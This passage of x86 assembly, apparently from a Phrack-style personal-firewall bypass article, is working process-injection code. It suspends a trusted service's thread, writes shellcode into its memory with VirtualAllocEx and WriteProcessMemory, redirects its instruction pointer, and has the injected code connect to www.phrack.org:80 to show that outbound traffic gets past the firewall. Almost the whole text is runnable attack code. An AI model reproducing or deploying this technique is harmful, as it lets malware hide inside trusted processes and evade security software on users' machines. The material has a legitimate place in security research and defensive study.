+        MOV     ws32base, EAX
+
+
+        LPROC   u32base,sMessageBox,pMessageBox
+        LPROC   ws32base,sWSAStartup,pWSAStartup
+        LPROC   ws32base,sWSACleanup,pWSACleanup
+        LPROC   ws32base,sSocket,pSocket
+        LPROC   ws32base,sConnect,pConnect
+        LPROC   ws32base,sSend,pSend
+        LPROC   ws32base,sRecv,pRecv
+        LPROC   ws32base,sClose,pClose
+
+        PSHS    wsa                  ; see our artificial data segment
+        PUSH    2                    ; Version 2 is fine
+        CALL    pWSAStartup          ; Do the WSAStartup()
+        CMP     EAX, 0
+        JNE     INJECT_ERROR
+
+        PUSH    0
+        PUSH    SOCK_STREAM          ; A normal stream oriented socket
+        PUSH    AF_INET              ; for Internet connections.
+        CALL    pSocket              ; Create it.
+        CMP     EAX, INVALID_SOCKET
+        JE      INJECT_ERROR
+        MOV     EBX,EAX
+
+        PUSH    SIZEOF sockaddr      ; Connect to www.phrack.org:80
+        PSHS    sAddr                ; hardcoded structure
+        PUSH    EBX                  ; that's our socket descriptor
+        CALL    pConnect             ; connect() to phrack.org
+        CMP     EAX, SOCKET_ERROR
+        JE      INJECT_ERROR
+
+        PUSH    0                    ; no flags
+        PUSH    028H                 ; 40 bytes to send
+        PSHS    sRequ                ; the GET string
+        PUSH    EBX                  ; socket descriptor
+        CALL    pSend                ; send() HTTP request
+        CMP     EAX, SOCKET_ERROR
+        JE      INJECT_ERROR
+
+
+        ; We now have to receive the server's reply. We only
+        ; want the HTTP header to display it in a message box
+        ; as an indicator for a successful bypass. 
+ 
+
+        MOV     ECX, 0               ; number of bytes received
+
+PP:     MOV     EDX, iBase 
+        ADD     EDX, OFFSET sRepl-inject
+
+        ADD     EDX, ECX             ; EDX is the current position inside
+                                     ; the string buffer
+        PUSH    EDX
+        PUSH    ECX
+
+        PUSH    0                    ; no flags
+        PUSH    1                    ; one byte to receive
+        PUSH    EDX                  ; string buffer
+        PUSH    EBX                  ; socket descriptor
+        CALL    pRecv                ; recv() the byte      
+
+        POP     ECX
+        POP     EDX
+
+        CMP     AL, 1                ; one byte received ?
+        JNE     PPE                  ; an error occured
+        CMP     ECX,2                ; check if we already received
+        JS      PP2                  ; more than 2 bytes
+
+        MOV     AL, [EDX]            ; this is the byte we got
+        CMP     AL, [EDX-2]          ; we are looking for <CRLF><CRLF>
+        JNE     PP2
+        CMP     AL, 10               ; we found it, most probably.
+        JE      PPE                  ; we only want the headers.
+        
+PP2:    INC     ECX
+        CMP     ECX,600              ; 600 byte maximum buffer size
+        JNE     PP
+
+
+PPE:    PUSH    EBX                  ; socket descriptor
+        CALL    pClose               ; close the socket
+
+        PUSH    64                   ; neat info icon and an ok button
+        PSHS    sCap                 ; the caption string
+        PSHS    sRepl                ; www.phrack.org's HTTP header
+        PUSH    0                     
+        CALL    pMessageBox          ; display the message box.
+
+        JMP     INJECT_SUCCESS       ; we were successful.
+
+INJECT_SUCCESS:
+        PUSH    1                    ; return success
+        JMP     INJECT_CLEANUP
+ 
+INJECT_ERROR:
+        PUSH    0                    ; return failure
+
+INJECT_CLEANUP:
+
+        PUSH    EAX                  ; save our return value
+        CMP     pWSACleanup,0
+        JE      INJECT_DONE
+        CALL    pWSACleanup          ; perform cleanup
+        CMP     ws32base, 0          ; check if we have loaded ws2_32
+        JE      INJECT_DONE
+        PUSH    ws32base
+        CALL    pFreeLibrary         ; release ws2_32.dll
+        
+        ; the following code is the only real difference
+        ; to the code in sample #1. It is used to signal
+        ; an event with the name "TINY0" so that the 
+        ; injector executable knows when this code has
+        ; done its job.
+
+        CMP     pOpenEvent, 0        
+        JE      INJECT_DONE
+        
+        PSHS    sFWPEVENT            ; "TINY0"
+        PUSH    0                    ; not inheritable
+        PUSH    EVENT_ALL_ACCESS     ; whatever
+        CALL    pOpenEvent           ; open the event
+        CMP     EAX, 0
+        JE      INJECT_DONE
+        MOV     EBX, EAX
+        
+        PUSH    EBX
+        CALL    pSetEvent            ; signal the event
+        
+        PUSH    EBX
+        CALL    pCloseHandle         ; close the handle
+
+INJECT_DONE:
+
+        POP     EAX
+        RET                          ; and return
+
+inject  ENDP
+iend:
+
+
+ 
+bypass  PROC
+
+        LOCAL   pinf             :PROCESS_INFORMATION
+        LOCAL   mct              :CONTEXT
+        
+        LOCAL   dwReturn         :DWORD ; return value
+        LOCAL   dwRemoteThreadID :DWORD ; remote thread ID
+        LOCAL   pbRemoteMemory   :DWORD ; remote base address 
+
+        MOV     pinf.hProcess, 0
+        MOV     pinf.hThread, 0
+        
+        ; First of all, creat the even that we need to get
+        ; informed about the progress of our injected code.
+        
+        INVOKE  CreateEvent, 0, 1, 0, OFFSET IEV_NAME
+        EJUMP   BPE5
+        MOV     IEV_HANDLE, EAX
+ 
+        ; Find a suitable, trusted process that we can use
+        ; to hijack its primary thread. We will then pause
+        ; that primary thread and make sure that its suspend
+        ; count is exactly 1. It might seem a bit too careful,
+        ; but if the primary thread is already suspended at 
+        ; the moment of infection, we have a problem. Thus,
+        ; we will rather make sure with some more commands 
+        ; that the thread can be resumed with a single call
+        ; to ResumeThread().
+ 
+        INVOKE  getsvc, ADDR pinf
+        EJUMP   BPE5
+        
+        INVOKE  SuspendThread, pinf.hThread
+        
+        CMP     EAX, 0FFFFFFFFH
+        JE      BPE3
+        CMP     EAX, 0
+        JE      SPOK
+SPL:    INVOKE  ResumeThread, pinf.hThread
+        CMP     EAX, 1
+        JNE     SPL        
+        
+        ; Here we go, the thread is paused and ready to be
+        ; hijacked. First, we get the EIP register along with
+        ; some others that do not interest us.
+        
+SPOK:   MOV     mct.ContextFlags, CONTEXT_CONTROL    
+        INVOKE  GetThreadContext, pinf.hThread, ADDR mct 
+        EJUMP   BPE2
+        
+        ; Now, allocate memory in the remote process' address
+        ; space for the shellcode and the injected function
+        
+        INVOKE  VirtualAllocEx,pinf.hProcess,0,ALLSZE, \
+                MEM_COMMIT,PAGE_EXECUTE_READWRITE
+        EJUMP   BPE2       
+        MOV     pbRemoteMemory,EAX
+
+        
+        MOV     EBX, EAX         ; EBX: remote base address
+        
+        ADD     EAX, CODESZE     ; this is the future address
+        MOV     PUSH_ADDR, EAX   ; of the inject function
+        
+        MOV     EAX, mct.regEip  ; this is the current EIP
+        MOV     EDX, EBX         ; EDX: remote base address
+        ADD     EDX, JUMPDIFF    ; EDX: absolute address of JMP call
+        
+        ; Now we calculate the distance between the JMP call and
+        ; the current EIP. The JMP CPU instruction is followed by
+        ; a double word that contains the relative number of bytes
+        ; to jump away from the current position. This is a signed
+        ; long value which is basically added to the EIP register.
+        ; To calculate the appropriate value, we need to subtract
+        ; the position of the JMP call from the offset we want to
+        ; jump to and subtract another 5 byte since the JMP
+        ; instruction itself has that length.
+        
+        SUB     EAX, EDX
+        SUB     EAX, 05H
+        MOV     JUMP_ADDR, EAX  
+        
+        ; Our shellcode is now complete, we will write it along
+        ; with the inject function itself to the remote process.
+
+        INVOKE  WriteProcessMemory,pinf.hProcess,EBX, \
+                OFFSET SHELLCODE,CODESZE,0
+        EJUMP   BPE1
+        ADD     EBX, CODESZE
+        
+        INVOKE  WriteProcessMemory,pinf.hProcess,EBX, \
+                FUNCADDR,FUNCSZE,0
+        EJUMP   BPE1
+
+        ; Done. Now hijack the primary thread by resetting its
+        ; instruction pointer to continue the flow of execution
+        ; at the offset of our own, injected code
+
+        MOV     EDX, pbRemoteMemory
+        MOV     mct.regEip, EDX
+        
+        INVOKE  SetThreadContext, pinf.hThread, ADDR mct
+        EJUMP   BPE1
+        
+        ; And let the thread continue ...
+        
+        INVOKE  ResumeThread, pinf.hThread
+        CMP     EAX, 0FFFFFFFFH
+        JE      BPE1
+
+        ; Now this is where we are making use of the event we
+        ; created. We will wait until the injected code signals
+        ; the event (at a reasonable timeout) and sleep for
+        ; another second to make sure our code has done its 
+        ; job completely before we start with the cleanup.
+
+        INVOKE  WaitForSingleObject, IEV_HANDLE, 60000
+        CMP     EAX, 0
+        JE      BPOK
+
+        ; However, if something goes wrong it is better
+        ; to terminate the thread as silently as possible.
+        
+        INVOKE  TerminateThread, pinf.hThread, 1
+               
+BPOK:   INVOKE  Sleep, 1000
+              
+BPE1:   INVOKE  VirtualFreeEx,pinf.hProcess, \
+                pbRemoteMemory,ALLSZE,MEM_RELEASE
+                
+BPE2:   INVOKE  ResumeThread, pinf.hThread
+     
+BPE3:   CMP     pinf.hThread, 0
+        JE      BPE4
+        INVOKE  CloseHandle,pinf.hThread
+BPE4:   CMP     pinf.hProcess, 0
+        JE      BPE5
+        INVOKE  CloseHandle,pinf.hProcess
+BPE5:   INVOKE  CloseHandle, IEV_HANDLE
+        RET
+
+bypass  ENDP
+
+END Main
